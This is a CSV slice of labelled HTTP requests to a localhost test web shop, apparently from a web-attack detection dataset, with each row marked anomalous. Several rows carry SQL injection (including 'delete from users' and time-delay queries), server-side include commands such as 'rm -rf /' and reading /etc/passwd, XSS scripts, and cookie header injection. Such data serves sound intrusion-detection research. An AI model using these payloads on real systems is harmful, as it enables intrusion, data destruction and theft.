,request,label
308,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
309,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=beate&password=l�brega&nombre=fiona&apellidos=aguilar+sanz&email=glassberg@professionalhosting.com.tf&dni=09324887c&direccion=carrer+castell+84,+&ciudada=peque&cp=06177&provincia=m�laga&ntc=2283238465616456&b1=registrar",1
310,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=armand&password=prusiato&nombre=samia&apellidos=catalayud+mirabet&email=balademas.mareuil6@enlanzarote.com.vc&dnia=28178710f&direccion=c/+cala,+9,+&ciudad=mutxamel&cp=25332&provincia=zaragoza&ntc=8608089924764976&b1=registrar",1
311,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=|&login=denna&password=89s0r56gl8&nombre=reynard&apellidos=h�rard&email=bardy@busquedadeempleo.mw&dni=18720571c&direccion=ordo�ez+31,+4?g&ciudad=vinuesa&cp=50584&provincia=zaragoza&ntc=0820484159407817&b1=registrar",1
312,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&logina=dorrie&password=acopio&nombre=sergio&apellidos=buix�+diclo&email=ben-amotz-hehn@clubforex.io&dni=53702702w&direccion=pla�a+josep+maria+folch+i+torres,+15+5-g&ciudad=villamandos&cp=09244&provincia=badajoz&ntc=1143578341526495&b1=registrar",1
313,gethttp://localhost:8080/tienda1/imagenes/2.gif/asf-logo-wide.bak,1
314,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=150&b1=confirmar,1
315,gethttp://localhost:8080/tienda1/global/estilos.css.old,1
316,gethttp://localhost:8080/asf-logo-wide.java,1
317,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kimble&password=tolemaica&nombre=liberia&apellidos=porcel+tonk&email=kedrova@pablobracamonte.hn&dni=12439508g&direccion=madre+carmen+del+ni�o+jesus,+48+&ciudad=torremormoj�n&cp=03738&provinciaa=girona&ntc=9728949065368673&b1=registrar",1
318,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=vino+rioja&precio=39&cantidad=93&b1=a�adir+al+carrito,1
319,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8699&b1a=confirmar,1
320,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jasver9&pwd=76r9v3t2&remembera=off&b1=entrar,1
321,gethttp://localhost:8080/tienda1/publico/entrar.jsp.inc,1
322,gethttp://localhost:8080/tienda1.old,1
323,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=briana&password=1es8r59z6&nombre=mayid&apellidos=pareja&email=eggerikx@intercambiodeenlaces.gl&dni=72999469e&direccion=c/+hipodromo+de+pineda,+123,+11-g&ciudad=cinco+olivas&cp=42169&provincia=barcelo+n*a&ntc=1600482599299219&b1=registrar",1
324,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2='+delete+from+users,1
325,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=86&b1a=a�adir+al+carrito,1
326,gethttp://localhost:8080/tienda1.old,1
327,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id='+delete+from+users,1
328,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=genevra&password=s_otil&nombre=alan&apellidos=casadej�s+mico&email=whitley@getgold.ye&dni=927023361&direccion=doutor+castro,+63,+&ciudad=antzuola&cp=17256&provincia=cantabria&ntc=4927430692083942&b1=registrar",1
329,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8459&b1=confirmar/,1
330,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kimble&password=tolemaica&nombre=liberia&apellidos=porcel+tonk&email=kedrova@pablobracamonte.hn&dni=27b1b74895g&direccion=madre+carmen+del+ni�o+jesus,+48+&ciudad=torremormoj�n&cp=03738&provincia=girona&ntc=9728949065368673&b1=registrar",1
331,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasand+1=1,1
332,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2,1
333,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&nombre=queso+manchego&precio=100&cantidad=15&b1=a�adir+al+carrito",1
334,gethttp://localhost:8080/tienda1/4861362529278789730.old,1
335,gethttp://localhost:8080/tienda1/miembros/fotos.jsp/4861362529278789730,1
336,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6071&b1a=confirmar,1
337,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=stouder&pwd=orea/nt/e&remember=on&b1=entrar,1
338,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=irice&pwd=69226p9as6a&remember=off&b1=entrar,1
339,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modoa=registro&login=amjad&password=monj�o&nombre=pancracio&apellidos=cornelas&email=linaker1@naturalchild.pm&dni=04121787a&direccion=codigo+apartados+particulares+oficiales+y+lista,+19+&ciudad=cendea+de+olza/oltza+zendea&cp=06176&provincia=soria&ntc=2476472046518932&b1=registrar",1
340,"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=""><!--#exec+cmd=""dir+""--><",1
341,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
342,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yeohoon&password=afectivo&nombre=nelma&apellidos=vic�n+revuelta&email=and+1=1&dni=05422497v&direccion=avenida+xixo,+150+13b&ciudad=corcubi�n&cp=31130&provincia=zaragoza&ntc=8951724239129499&b1=registrar",1
343,gethttp://localhost:8080/asf-logo-wide.gif,1
344,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chihchie&pwd=unicidad&remember=off/&b1=entrar,1
345,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
346,gethttp://localhost:8080/tienda1/publico/asf-logo-wide,1
347,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=arco&password=saxosa&nombre=c�sar&apellidos=nossa+vizcarrondo&email=kunzer.giorgelli@cochesautomaticos.kn&dni=64841759k&direccion=calle+higueras,+37+&ciudad=uni�n+de+campos,+la&cp=20130&provincia=segovia&ntc=1690304707007095&b1=';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%",1
348,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=<!--#include+file=""archivo_secreto""+-->&precio=85&cantidad=22&b1=a�adir+al+carrito",1
349,"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=an-son&pwd=4up493a562i5&remember=on','0','0','0','0');waitfor+delay+'0:0:15';--&b1=entrar",1
350,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=1784&b1=pasar+por+caja,1
351,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sherri&password=adj9d8cat0r55&nombre=amaru&apellidos=gilabert&email=chimento@fuzzy.bb&dni=66365789w&direccion=plaza+doctor+quemada+88+8-h&ciudad=castrocalb�n&cp=19268&provincia=asturias&ntc=210713793422155a&b1=registrar,1
352,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg='injected_param,1
353,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=4077&b1=confirmar,1
354,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1set-cookie%3a+tamper%3d1041264011025374727,1
355,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=de_crist&pwd=5ra0sf873ismo&remember=on&b1=entrar,1
356,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=jam�n+ib�rico&precio=39&cantidad=24&b1=a�adir+al+carrito,1
357,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alix&password=veni!a&nombrea=imelda&apellidos=delb�n+coll&email=holister@brunoseguridad.cf&dni=80525673m&direccion=plza.+noria+de+la+huerta+68,+&ciudad=alcudia+de+veo&cp=28690&provincia=�vila&ntc=6551003767368321&b1=registrar",1
358,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=danyelle&passworda=?flor�fero&nombre=mikhail&apellidos=gebhardt&email=reverend@enla.ae&dni=41928757x&direccion=c/+los+tilos,+118+12-b&ciudad=altarejos&cp=44134&provincia=toledo&ntc=4582988333379536&b1=registrar",1
359,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=derosenr&password=abarracar&nombre=trist�n&apellidos=pol+lazcano&email=braverman-watkin@docerosas.pl&dni=28010640k&direccion=c/+antoni+rosello+i+nadal+172+&ciudad=blancafort&cp=50522&provincia=burgos&ntc=7871877495462595bob@<script>alert(paros)</script>.parosproxy.org&b1=registrar,1
360,gethttp://localhost:8080/tienda1/miembros/fotos.jsp/asf-logo-wide,1
361,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
362,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=checinsk&password=c2ad953u8ro&nombre=neria&apellidos=taronger&email=torgov-mattera@yksoluap.edu&dni=74014005m&direccion=avenida+roque+de+gando,+193,+7?e&ciudad=castrobol&cp=26324&provincia=cuenca&ntc=5680554856223107<script>alert(""paros"");</script>&b1=registrar",1
363,gethttp://localhost:8080/4861362529278789730,1
364,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
365,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chandras&pwd=h+olgona&remember=on&b1a=entrar,1
366,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lemar&password=43lpe7de2o&nombre=bianca&apellidos=valor+agudo&email=vallarine7@7horas.mo&dni=90125861q&direccion=plaza+monasterio+de+la+oliva,+s/n,+&ciudad=tembleque&cp='+delete+from+users&provincia=navarra&ntc=7119531551958366&b1=registrar",1
367,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9671&b1a=pasar+por+caja,1
368,"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1','0');waitfor+delay+'0:0:15';--",1
369,gethttp://localhost:8080/tienda1/publico/anadir.jsp?ida=1&nombre=queso+manchego&precio=85&cantidad=65&b1=a�adir+al+carrito,1
370,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=eldin&password=b9r4enillo&nombre=rogelio&apellidosa=facuse+planell&email=rehkopf_sell@zarahealth.cy&dni=31415477f&direccion=c/+el+greco+98,+&ciudad=ll�ria&cp=34259&provincia=toledo&ntc=1530250570237050&b1=registrar",1
371,"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito<script>alert(""paros"");</script>",1
372,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jovo&password=28l3ra8a&nombre=hebelen&apellidos=fornalino+grimaldi&email=ozaki_wanamaker@travelzone.tel&dni=75981771y&direccion=calle+san+juan+bautista+de+la+salle+193+6?c&ciudad=calatorao&cp=10191&provincia=burgos&ntc=3393638948319901&b1=registrar');waitfor+delay+'0:0:15';--,1
373,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=colline&password=h30i2o&nombre=pro*copio&apellidos=mateu+bernaus&email=sorili@am-si.nf&dni=75667654t&direccion=c/+del+torrent+de+l'olla,+111+11?d&ciudad=fuerte+del+rey&cp=49610&provincia=guadalajara&ntc=5880986678228634&b1=registrar",1
374,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
375,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
376,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
377,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=');waitfor+delay+'0:0:15';--,1
378,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
379,gethttp://localhost:8080/tienda1/publico/anadir.jsp/4861362529278789730.inc,1
380,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login='+theolog'o&pwd=m50879rist44&remember=on&b1=entrar,1
381,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chihchie&pwd=unicidad&remembera=off&b1=entrar,1
382,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1510&b1=confirmar/,1
383,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasbob@<script>alert(paros)</script>.parosproxy.org,1
384,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hatchett&password=13ua29i7lar&nombre=adara+adela&apellidos=rossi+woolrich&email=luvv@ers@hiper@xxx.cx&dni=73280026w&direccion=calle+bordadores,+100,+6?c&ciudad=sobremunt&cp=44411&provincia=asturias&ntc=1840594959799208&b1=registrar",1
385,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n'+ib�ric-'o&precio=39&cantidad=6&b1=a�adir+al+carrito,1
386,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=van_kess&pwd=3ran48&remember=on&b1=%2b,1
387,gethttp://localhost:8080/tienda1/publico/entrar.jsp/asf-logo-wide.gif/.inc,1
388,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
389,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=hilliary&pwd=central2izaci�n&remember=on&b1=entrar,1
390,gethttp://localhost:8080/iissamples/dfault/samples.asp,1
391,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=queso+manchego&precio=39&cantidad=62&b1=a�adir+al+carrito,1
392,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=diahann&password=marcel_ino&nombre=asad&apellidos=tonato+valle&email=grizzard@ytv.com.mv&dni='+and+'1'='1&direccion=c/+juan+de+lara+115,+9?a&ciudad=mazcuerras&cp=43393&provincia=valencia&ntc=8430846550683709&b1=registrar",1
393,gethttp://localhost:8080/cfide/administrator/welcomeexapps.cfm,1
394,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rici&password=aguiscar&nombre=c�stulo&apellidos=errante+bov�&email=porokhovschikov@placeresadultos.st&dni=50383140f&direccion=calle+de+san+lorenzo+88,+4?e&ciudad=bocairent&cp=32780&provincia=c�ceres&ntc=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&b1=registrar",1
395,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lemmie&pwda=intempesti+vo&remember=on&b1=entrar,1
396,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2/&nombre=queso+manchego&precio=39&cantidad=84&b1=a�adir+al+carrito,1
397,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=patricio&pwd=galo1he0o&remember=';waitfor+delay+'0:0:15';--&b1=entrar,1
398,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=100any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727%0d%0a&cantidad=47&b1=a�adir+al+carrito,1
399,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chihchie&pwd=s927r�9i0o&remember=off&b1a=entrar,1
